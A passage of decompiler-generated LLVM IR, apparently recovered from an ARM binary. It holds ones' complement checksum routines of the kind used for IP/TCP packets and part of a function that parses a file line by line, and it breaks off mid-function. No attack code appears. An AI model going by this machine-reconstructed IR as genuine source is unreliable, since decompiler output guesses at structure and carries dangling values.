  %v3_c750 = load i32, i32* %stack_var_-44, align 4
  %v5_c758 = mul i32 %v3_c750, 24
  %v0_c75c = load i32, i32* %r4.global-to-local, align 4
  %v1_c75c = and i32 %v0_c75c, 16711680
  %v3_c760 = udiv i32 %v0_c75c, 16777216
  %v4_c764 = udiv i32 %v1_c75c, 256
  %v5_c764 = or i32 %v4_c764, %v3_c760
  store i32 %v5_c764, i32* %r2.global-to-local, align 4
  %v1_c768 = load i32, i32* @r8, align 4
  %v2_c768 = add i32 %v1_c768, %v5_c758
  store i32 %v2_c768, i32* %r1.global-to-local, align 4
  %v1_c76c = and i32 %v0_c75c, 65280
  store i32 %v1_c76c, i32* %r3.global-to-local, align 4
  %v1_c770 = add i32 %v2_c768, 20
  %v2_c770 = inttoptr i32 %v1_c770 to i8*
  %v3_c770 = load i8, i8* %v2_c770, align 1
  %v4_c770 = zext i8 %v3_c770 to i32
  %v5_c778 = call i32 @llvm.bswap.i32(i32 %v0_c75c)
  %v7_c77c = lshr i32 %v0_c74c, %v4_c770
  %v8_c77c = add i32 %v7_c77c, %v5_c778
  store i32 %v8_c77c, i32* %r2.global-to-local, align 4
  %v1_c780 = and i32 %v8_c77c, 16711680
  store i32 %v1_c780, i32* %r0.global-to-local, align 4
  %v1_c78c = and i32 %v8_c77c, 65280
  store i32 %v1_c78c, i32* %r1.global-to-local, align 4
  %v5_c794 = call i32 @llvm.bswap.i32(i32 %v8_c77c)
  %v1_c798 = load i32, i32* @r5, align 4
  %v2_c798 = add i32 %v1_c798, 16
  %v3_c798 = inttoptr i32 %v2_c798 to i32*
  store i32 %v5_c794, i32* %v3_c798, align 4
  store i32 %v6_c34c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7a0, label %dec_label_pc_c7a8, label %dec_label_pc_c664

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c748, %dec_label_pc_c658
  %v0_c7a8 = call i32 @function_e094()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c7b0 = load i32, i32* @r5, align 4
  %v2_c7b0 = add i32 %v1_c7b0, 12
  %v3_c7b0 = inttoptr i32 %v2_c7b0 to i32*
  store i32 %v0_c7a8, i32* %v3_c7b0, align 4
  store i32 %v3_c3b4, i32* %r0.global-to-local, align 4
  %v0_c7b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c7b8 = add i32 %v0_c7b8, -1
  store i32 %v1_c7b8, i32* @r4, align 4
  %v9_c7bc = icmp eq i32 %v3_c3b4, %v1_c7b8
  store i1 %v9_c7bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7bc, label %dec_label_pc_c7c4, label %dec_label_pc_c678

dec_label_pc_c7c4:                                ; preds = %dec_label_pc_c7a8, %dec_label_pc_c664
  %v0_c7c4 = call i32 @function_e094()
  %v1_c7c4 = trunc i32 %v0_c7c4 to i16
  store i32 %v0_c7c4, i32* %r0.global-to-local, align 4
  store i32 %v3_c3b8, i32* %r1.global-to-local, align 4
  %v1_c7cc = load i32, i32* @r4, align 4
  %v9_c7cc = icmp eq i32 %v3_c3b8, %v1_c7cc
  store i1 %v9_c7cc, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d0 = load i32, i32* @r5, align 4
  %v4_c7d0 = add i32 %v3_c7d0, 4
  %v5_c7d0 = inttoptr i32 %v4_c7d0 to i16*
  store i16 %v1_c7c4, i16* %v5_c7d0, align 2
  br i1 %v9_c7cc, label %dec_label_pc_c7d8, label %dec_label_pc_c7c4.dec_label_pc_c684_crit_edge

dec_label_pc_c7c4.dec_label_pc_c684_crit_edge:    ; preds = %dec_label_pc_c7c4
  %v1_c688.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c684

dec_label_pc_c7d8:                                ; preds = %dec_label_pc_c7c4, %dec_label_pc_c678
  %v0_c7d8 = call i32 @function_e094()
  %v1_c7d8 = trunc i32 %v0_c7d8 to i16
  store i32 %v0_c7d8, i32* %r0.global-to-local, align 4
  store i32 %v3_c3bc, i32* %r2.global-to-local, align 4
  %v1_c7e0 = load i32, i32* @r4, align 4
  %v9_c7e0 = icmp eq i32 %v3_c3bc, %v1_c7e0
  store i1 %v9_c7e0, i1* %cpsr_z.global-to-local, align 1
  %v3_c7e4 = load i32, i32* @r5, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7d8, i16* %v5_c7e4, align 2
  br i1 %v9_c7e0, label %dec_label_pc_c7ec, label %dec_label_pc_c7d8.dec_label_pc_c690_crit_edge

dec_label_pc_c7d8.dec_label_pc_c690_crit_edge:    ; preds = %dec_label_pc_c7d8
  %v1_c694.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c690

dec_label_pc_c7ec:                                ; preds = %dec_label_pc_c7d8, %dec_label_pc_c684
  %v0_c7ec = call i32 @function_e094()
  %v1_c7ec = trunc i32 %v0_c7ec to i16
  store i32 %v0_c7ec, i32* %r0.global-to-local, align 4
  store i32 %v5_c288, i32* %r3.global-to-local, align 4
  %v1_c7f4 = load i32, i32* @r4, align 4
  %v9_c7f4 = icmp eq i32 %v5_c288, %v1_c7f4
  store i1 %v9_c7f4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7f8 = load i32, i32* @r6, align 4
  %v4_c7f8 = add i32 %v3_c7f8, 2
  %v5_c7f8 = inttoptr i32 %v4_c7f8 to i16*
  store i16 %v1_c7ec, i16* %v5_c7f8, align 2
  br i1 %v9_c7f4, label %dec_label_pc_c800, label %dec_label_pc_c7ec.dec_label_pc_c69c_crit_edge

dec_label_pc_c7ec.dec_label_pc_c69c_crit_edge:    ; preds = %dec_label_pc_c7ec
  %v1_c6a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c69c

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7ec, %dec_label_pc_c690
  %v0_c800 = call i32 @function_e094()
  %v1_c804 = load i32, i32* @r6, align 4
  %v2_c804 = add i32 %v1_c804, 4
  %v3_c804 = inttoptr i32 %v2_c804 to i32*
  store i32 %v0_c800, i32* %v3_c804, align 4
  store i32 %v6_c2a0, i32* %r0.global-to-local, align 4
  %v1_c80c = load i32, i32* @r4, align 4
  %v9_c80c = icmp eq i32 %v6_c2a0, %v1_c80c
  store i1 %v9_c80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c80c, label %dec_label_pc_c814, label %dec_label_pc_c6a8

dec_label_pc_c814:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c69c
  %v0_c814 = call i32 @function_e094()
  store i32 %v0_c814, i32* %r0.global-to-local, align 4
  %v0_c818 = load i32, i32* @fp, align 4
  %v2_c818 = icmp eq i32 %v0_c818, 0
  store i1 %v2_c818, i1* %cpsr_z.global-to-local, align 1
  %v1_c81c = load i32, i32* @r6, align 4
  %v2_c81c = add i32 %v1_c81c, 8
  %v3_c81c = inttoptr i32 %v2_c81c to i32*
  store i32 %v0_c814, i32* %v3_c81c, align 4
  br i1 %v2_c818, label %dec_label_pc_c6b0, label %dec_label_pc_c824

dec_label_pc_c824:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c814
  %v0_c824 = call i32 @function_e094()
  %v1_c824 = trunc i32 %v0_c824 to i16
  store i32 %v0_c824, i32* %r0.global-to-local, align 4
  %v3_c828 = load i32, i32* @r6, align 4
  %v4_c828 = add i32 %v3_c828, 18
  %v5_c828 = inttoptr i32 %v4_c828 to i16*
  store i16 %v1_c824, i16* %v5_c828, align 2
  br label %dec_label_pc_c6b0

dec_label_pc_c830:                                ; preds = %dec_label_pc_c370
  %v0_c830 = load i32, i32* @sl, align 4
  store i32 %v0_c830, i32* %r0.global-to-local, align 4
  %v1_c834 = call i32 @function_10be0(i32 %v0_c830)
  store i32 %v1_c834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c838

dec_label_pc_c838:                                ; preds = %dec_label_pc_c19c, %dec_label_pc_c830
  %v1_c840 = phi i32 [ %v3_c360, %dec_label_pc_c19c ], [ %v1_c834, %dec_label_pc_c830 ]
  store i32 %v3_c19c, i32* %r4.global-to-local, align 4
  store i32 %v24_c19c, i32* %fp.global-to-local, align 4
  store i32 %v27_c19c, i32* %lr.global-to-local, align 4
  ret i32 %v1_c840

; uselistorder directives
  uselistorder i32 %v0_c824, { 1, 0 }
  uselistorder i32 %v0_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7d8, { 1, 0 }
  uselistorder i32 %v0_c7c4, { 1, 0 }
  uselistorder i32 %v1_c7b8, { 1, 2, 0 }
  uselistorder i32 %v0_c75c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c724, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c6f0, { 1, 0 }
  uselistorder i32 %v4_c6e0, { 1, 0 }
  uselistorder i1 %v3_c670, { 1, 0 }
  uselistorder i32 %v2_c614, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c47c, { 1, 2, 0 }
  uselistorder i32 %v1_c448, { 2, 1, 0 }
  uselistorder i32 %v1_c444, { 2, 0, 1 }
  uselistorder i32 %v1_c440, { 2, 0, 1 }
  uselistorder i32 %v1_c43c, { 2, 0, 1 }
  uselistorder i32 %v1_c418, { 1, 0 }
  uselistorder i32 %v3_c3b4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c3a8, { 1, 0, 2 }
  uselistorder i32 %v0_c3a4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c390, { 1, 0 }
  uselistorder i1 %v7_c364, { 1, 0 }
  uselistorder i32 %v3_c360, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c34c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c2a0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c288, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c20c, { 1, 0 }
  uselistorder i32 %v7_c1f4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 41, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_8570, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 95, 96, 97, 98, 99, 100, 101, 102, 91, 92, 93, 94, 103, 104, 105, 106 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c838, { 1, 0 }
  uselistorder label %dec_label_pc_c824, { 1, 0 }
  uselistorder label %dec_label_pc_c6b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c634, { 1, 0 }
  uselistorder label %dec_label_pc_c624, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @function_c848(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c848:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c86c, label %dec_label_pc_c854

dec_label_pc_c854:                                ; preds = %dec_label_pc_c848
  %v0_c85c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c858

dec_label_pc_c858:                                ; preds = %dec_label_pc_c858, %dec_label_pc_c854
  %v0_c864 = phi i32 [ %v2_c864, %dec_label_pc_c858 ], [ 0, %dec_label_pc_c854 ]
  %v0_c85c = phi i32 [ %v5_c85c, %dec_label_pc_c858 ], [ %v0_c85c.pre, %dec_label_pc_c854 ]
  %v0_c858 = phi i32 [ %v1_c858, %dec_label_pc_c858 ], [ %arg1, %dec_label_pc_c854 ]
  %v1_c858 = add i32 %v0_c858, -2
  %v1_c85c = inttoptr i32 %v0_c85c to i16*
  %v2_c85c = load i16, i16* %v1_c85c, align 2
  %v3_c85c = zext i16 %v2_c85c to i32
  %v5_c85c = add i32 %v0_c85c, -2
  store i32 %v5_c85c, i32* @r0, align 4
  %v2_c864 = add i32 %v3_c85c, %v0_c864
  %v1_c858.cmp = icmp ugt i32 %v1_c858, 1
  br i1 %v1_c858.cmp, label %dec_label_pc_c858, label %dec_label_pc_c86c.loopexit

dec_label_pc_c86c.loopexit:                       ; preds = %dec_label_pc_c858
  br label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c848, %dec_label_pc_c86c.loopexit
  %v1_c874 = phi i32 [ %v2_c864, %dec_label_pc_c86c.loopexit ], [ 0, %dec_label_pc_c848 ]
  %v0_c86c = phi i32 [ %v1_c858, %dec_label_pc_c86c.loopexit ], [ %arg1, %dec_label_pc_c848 ]
  %v7_c86c = icmp eq i32 %v0_c86c, 1
  br i1 %v7_c86c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c86c
  %v1_c870 = load i32, i32* @r0, align 4
  %v2_c870 = inttoptr i32 %v1_c870 to i8*
  %v3_c870 = load i8, i8* %v2_c870, align 1
  %v4_c870 = zext i8 %v3_c870 to i32
  %v3_c874 = add i32 %v1_c874, %v4_c870
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c86c, %bb
  %v0_c878 = phi i32 [ %v1_c874, %dec_label_pc_c86c ], [ %v3_c874, %bb ]
  %v3_c87c = urem i32 %v0_c878, 65536
  %v4_c880 = udiv i32 %v0_c878, 65536
  %v5_c880 = add nuw nsw i32 %v4_c880, %v3_c87c
  %v4_c884 = udiv i32 %v5_c880, 65536
  %v5_c884 = add nuw nsw i32 %v4_c884, %v5_c880
  %v1_c888 = urem i32 %v5_c884, 65536
  %v3_c890 = xor i32 %v1_c888, 65535
  ret i32 %v3_c890

; uselistorder directives
  uselistorder i32 %v5_c880, { 1, 0 }
  uselistorder i32 %v5_c85c, { 1, 0 }
  uselistorder i32 %v1_c858, { 1, 0, 2 }
  uselistorder i32 %v0_c85c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c86c, { 1, 0 }
}

define i32 @function_c898(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c898:
  %v1_c8a8 = add i32 %arg1, 12
  %v2_c8a8 = inttoptr i32 %v1_c8a8 to i32*
  %v3_c8a8 = load i32, i32* %v2_c8a8, align 4
  %v1_c8ac = add i32 %arg1, 16
  %v2_c8ac = inttoptr i32 %v1_c8ac to i32*
  %v3_c8ac = load i32, i32* %v2_c8ac, align 4
  %v7_c8b0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8b0, label %dec_label_pc_c8bc.preheader, label %dec_label_pc_c8d0

dec_label_pc_c8bc.preheader:                      ; preds = %dec_label_pc_c898
  %v0_c8c0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8bc

dec_label_pc_c8bc:                                ; preds = %dec_label_pc_c8bc.preheader, %dec_label_pc_c8bc
  %v0_c8c8 = phi i32 [ 0, %dec_label_pc_c8bc.preheader ], [ %v2_c8c8, %dec_label_pc_c8bc ]
  %v0_c8c0 = phi i32 [ %v0_c8c0.pre, %dec_label_pc_c8bc.preheader ], [ %v5_c8c0, %dec_label_pc_c8bc ]
  %v0_c8bc = phi i32 [ %arg3, %dec_label_pc_c8bc.preheader ], [ %v1_c8bc, %dec_label_pc_c8bc ]
  %v1_c8bc = add nsw i32 %v0_c8bc, -2
  %v1_c8c0 = inttoptr i32 %v0_c8c0 to i16*
  %v2_c8c0 = load i16, i16* %v1_c8c0, align 2
  %v3_c8c0 = zext i16 %v2_c8c0 to i32
  %v5_c8c0 = add i32 %v0_c8c0, -2
  store i32 %v5_c8c0, i32* @r1, align 4
  %v2_c8c8 = add i32 %v3_c8c0, %v0_c8c8
  %v8_c8cc = icmp sgt i32 %v1_c8bc, 1
  br i1 %v8_c8cc, label %dec_label_pc_c8bc, label %dec_label_pc_c8d0.loopexit

dec_label_pc_c8d0.loopexit:                       ; preds = %dec_label_pc_c8bc
  br label %dec_label_pc_c8d0

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c8d0.loopexit, %dec_label_pc_c898
  %v1_c8dc = phi i32 [ %v2_c8c8, %dec_label_pc_c8d0.loopexit ], [ 0, %dec_label_pc_c898 ]
  %v0_c8d0 = phi i32 [ %v1_c8bc, %dec_label_pc_c8d0.loopexit ], [ %arg3, %dec_label_pc_c898 ]
  %v7_c8d0 = icmp eq i32 %v0_c8d0, 1
  br i1 %v7_c8d0, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c8d0
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c8d0
  %v1_c8d4 = load i32, i32* @r1, align 4
  %v2_c8d4 = inttoptr i32 %v1_c8d4 to i8*
  %v3_c8d4 = load i8, i8* %v2_c8d4, align 1
  %v4_c8d4 = zext i8 %v3_c8d4 to i32
  %v3_c8dc = add i32 %v4_c8d4, %v1_c8dc
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c904 = phi i32 [ %v1_c8dc, %.thread ], [ %v3_c8dc, %bb ]
  %v0_c8e4 = mul i32 %v3_c8a8, 65536
  %v3_c8e4 = udiv i32 %v0_c8e4, 65536
  %v3_c8e8 = urem i32 %v3_c8ac, 65536
  %v4_c8f0 = udiv i32 %v3_c8a8, 65536
  %v2_c8ec = add nuw nsw i32 %v3_c8e8, %v4_c8f0
  %v5_c8f0 = add nuw nsw i32 %v2_c8ec, %v3_c8e4
  %v1_c8f4 = add i32 %arg1, 9
  %v2_c8f4 = inttoptr i32 %v1_c8f4 to i8*
  %v3_c8f4 = load i8, i8* %v2_c8f4, align 1
  %v4_c8f4 = zext i8 %v3_c8f4 to i32
  %v4_c8f8 = udiv i32 %v3_c8ac, 65536
  %v3_c900 = mul nuw nsw i32 %v4_c8f4, 256
  %v5_c8f8 = add i32 %v4_c8f8, %arg2
  %v2_c8fc = add i32 %v5_c8f8, %v1_c904
  %v2_c904 = add i32 %v2_c8fc, %v5_c8f0
  %v2_c908 = add i32 %v2_c904, %v3_c900
  %tmp = icmp ult i32 %v2_c908, 65536
  br i1 %tmp, label %dec_label_pc_c928, label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %bb19, %dec_label_pc_c914
  %v2_c91c5 = phi i32 [ %v2_c91c, %dec_label_pc_c914 ], [ %v2_c908, %bb19 ]
  %v3_c9206.in = phi i32 [ %v2_c91c, %dec_label_pc_c914 ], [ %v2_c908, %bb19 ]
  %v3_c9206 = udiv i32 %v3_c9206.in, 65536
  %v3_c918 = urem i32 %v2_c91c5, 65536
  %v2_c91c = add nuw nsw i32 %v3_c918, %v3_c9206
  %tmp20 = icmp ult i32 %v2_c91c, 65536
  br i1 %tmp20, label %dec_label_pc_c928.loopexit, label %dec_label_pc_c914

dec_label_pc_c928.loopexit:                       ; preds = %dec_label_pc_c914
  br label %dec_label_pc_c928

dec_label_pc_c928:                                ; preds = %dec_label_pc_c928.loopexit, %bb19
  %v0_c928 = phi i32 [ %v2_c91c, %dec_label_pc_c928.loopexit ], [ %v2_c908, %bb19 ]
  %v1_c928 = urem i32 %v0_c928, 65536
  %v3_c930 = xor i32 %v1_c928, 65535
  ret i32 %v3_c930

; uselistorder directives
  uselistorder i32 %v2_c91c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c908, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c8dc, { 1, 0 }
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v0_c8c0, { 1, 0 }
  uselistorder i32 %v3_c8a8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8bc, { 1, 0 }
}

define i32 @function_c93c(i32 %arg1) local_unnamed_addr {
dec_label_pc_c93c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c93c = load i32, i32* @r4, align 4
  %v6_c93c = load i32, i32* @r5, align 4
  %v9_c93c = load i32, i32* @r6, align 4
  %v12_c93c = load i32, i32* @r7, align 4
  %v15_c93c = load i32, i32* @r8, align 4
  %v18_c93c = load i32, i32* @sb, align 4
  %v21_c93c = load i32, i32* @sl, align 4
  %v24_c93c = load i32, i32* @fp, align 4
  %v27_c93c = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c958 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c958, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_c984 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c984, i32* @fp, align 4
  %v3_c990 = call i32 @function_11060(i8* nonnull %stack_var_-585, i32 0)
  %v2_c994 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c994, i32* @sl, align 4
  %v0_c998 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_c9a4 = bitcast i32* %stack_var_-8777 to i8*
  %v3_c9a4 = call i32 @function_11060(i8* %v2_c9a4, i32 %v0_c998)
  %v0_c9ac = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_c9b8 = bitcast i32* %stack_var_-4681 to i8*
  %v3_c9b8 = call i32 @function_11060(i8* %v2_c9b8, i32 %v0_c9ac)
  %v2_c9bc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9bc, i32* @sb, align 4
  %v0_c9c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c9c0 = udiv i32 %v0_c9c0, 256
  %v1_c9c4 = urem i32 %v0_c9c0, 256
  store i32 %v1_c9c4, i32* @r4, align 4
  %v3_c9d4 = trunc i32 %v3_c9c0 to i8
  %v4_c9d4 = call i32 @function_10580(i8 %v3_c9d4, i32 16, i32 %v2_c9bc)
  %v2_c9dc = call i32 @function_10120(i8* nonnull %stack_var_-72)
  %v7_c9e0 = icmp eq i32 %v2_c9dc, 2
  br i1 %v7_c9e0, label %dec_label_pc_cea4, label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c93c, %dec_label_pc_cea4
  %v1_c9ec = call i32 @function_fd40(i32 13)
  %v1_c9f4 = call i32 @function_fd40(i32 14)
  %v1_c9fc = call i32 @function_fd40(i32 15)
  %v1_ca04 = call i32 @function_fd40(i32 17)
  %v0_ca08 = load i32, i32* @r5, align 4
  %v2_ca10 = inttoptr i32 %v0_ca08 to i32*
  %v3_ca10 = call i32 @function_fc7c(i32 17, i32* %v2_ca10)
  %v0_ca14 = load i32, i32* @r5, align 4
  %v2_ca18 = call i32 @function_107ec(i32 %v3_ca10, i32 %v0_ca14)
  %v7_ca1c = icmp eq i32 %v2_ca18, -1
  store i32 %v2_ca18, i32* @r8, align 4
  br i1 %v7_ca1c, label %bb, label %dec_label_pc_ca2c.preheader

bb:                                               ; preds = %dec_label_pc_c9e8
  %v1_ca24 = load i32, i32* @r5, align 4
  store i32 %v1_ca24, i32* @r4, align 4
  br label %dec_label_pc_ce40

dec_label_pc_ca2c.preheader:                      ; preds = %dec_label_pc_c9e8
  %v4_ca3856 = call i32 @function_10380(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca18)
  %v2_ca3c58 = icmp eq i32 %v4_ca3856, 0
  br i1 %v2_ca3c58, label %dec_label_pc_cbc4.loopexit, label %dec_label_pc_ca44.lr.ph

dec_label_pc_ca44.lr.ph:                          ; preds = %dec_label_pc_ca2c.preheader
  %v2_ca8c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca44.lr.ph, %dec_label_pc_ca2c.backedge
  %v3_ca48 = load i8, i8* %stack_var_-585, align 1
  %v4_ca48 = sext i8 %v3_ca48 to i32
  %v2_ca4c = icmp eq i8 %v3_ca48, 0
  br i1 %v2_ca4c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca44
  %v8_ca50 = icmp eq i8 %v3_ca48, 58
  br i1 %v8_ca50, label %.thread8, label %dec_label_pc_ca64

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_ca7c

bb126:                                            ; preds = %dec_label_pc_ca44
  br label %dec_label_pc_ca7c

dec_label_pc_ca64:                                ; preds = %bb125
  %v1_ca6c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ca68

dec_label_pc_ca68:                                ; preds = %bb127, %dec_label_pc_ca64
  %v0_ca68 = phi i32 [ %v1_ca68, %bb127 ], [ 0, %dec_label_pc_ca64 ]
  %v1_ca68 = add i32 %v0_ca68, 1
  %v2_ca6c = add i32 %v1_ca68, %v1_ca6c.pre
  %v3_ca6c = inttoptr i32 %v2_ca6c to i8*
  %v4_ca6c = load i8, i8* %v3_ca6c, align 1
  %v6_ca6c = zext i8 %v4_ca6c to i32
  %v2_ca70 = icmp eq i8 %v4_ca6c, 0
  br i1 %v2_ca70, label %dec_label_pc_ca7c, label %bb127

bb127:                                            ; preds = %dec_label_pc_ca68
  %v8_ca74 = icmp eq i8 %v4_ca6c, 58
  br i1 %v8_ca74, label %dec_label_pc_ca7c, label %dec_label_pc_ca68

dec_label_pc_ca7c:                                ; preds = %dec_label_pc_ca68, %bb127, %bb126, %.thread8
  %v1_caa8 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_ca68, %bb127 ], [ %v1_ca68, %dec_label_pc_ca68 ]
  %v0_ca7c = phi i32 [ %v4_ca48, %.thread8 ], [ %v4_ca48, %bb126 ], [ %v6_ca6c, %bb127 ], [ %v6_ca6c, %dec_label_pc_ca68 ]
  %v2_ca7c = icmp eq i32 %v0_ca7c, 0
  br i1 %v2_ca7c, label %dec_label_pc_ca2c.backedge, label %dec_label_pc_ca84

dec_label_pc_ca2c.backedge:                       ; preds = %dec_label_pc_ca7c, %dec_label_pc_cb4c, %dec_label_pc_cb98, %dec_label_pc_cac8
  %v0_ca34 = load i32, i32* @r8, align 4
  %v4_ca38 = call i32 @function_10380(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca34)
  %v2_ca3c = icmp eq i32 %v4_ca38, 0
  br i1 %v2_ca3c, label %dec_label_pc_cbc4.loopexit, label %dec_label_pc_ca44

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca7c
  %v1_ca88 = add i32 %v1_caa8, 2
  %v2_ca90 = add i32 %v1_ca88, %v2_ca8c
  %v1_ca94 = add i32 %v2_ca90, -545
  %v2_ca94 = inttoptr i32 %v1_ca94 to i8*
  %v3_ca94 = load i8, i8* %v2_ca94, align 1
  %v2_ca98 = icmp eq i8 %v3_ca94, 0
  br i1 %v2_ca98, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_ca84
  %v8_ca9c = icmp eq i8 %v3_ca94, 32
  br i1 %v8_ca9c, label %.thread13, label %dec_label_pc_caa8

.thread13:                                        ; preds = %bb128
  store i32 %v1_ca88, i32* @r5, align 4
  br label %dec_label_pc_cac8

bb129:                                            ; preds = %dec_label_pc_ca84
  store i32 %v1_ca88, i32* @r5, align 4
  br label %dec_label_pc_cac8

dec_label_pc_caa8:                                ; preds = %bb128
  %v0_caa8 = load i32, i32* @r6, align 4
  %v2_caa8 = add i32 %v0_caa8, %v1_caa8
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %bb130, %dec_label_pc_caa8
  %v0_cabc16 = phi i32 [ %v1_cabc, %bb130 ], [ %v1_ca88, %dec_label_pc_caa8 ]
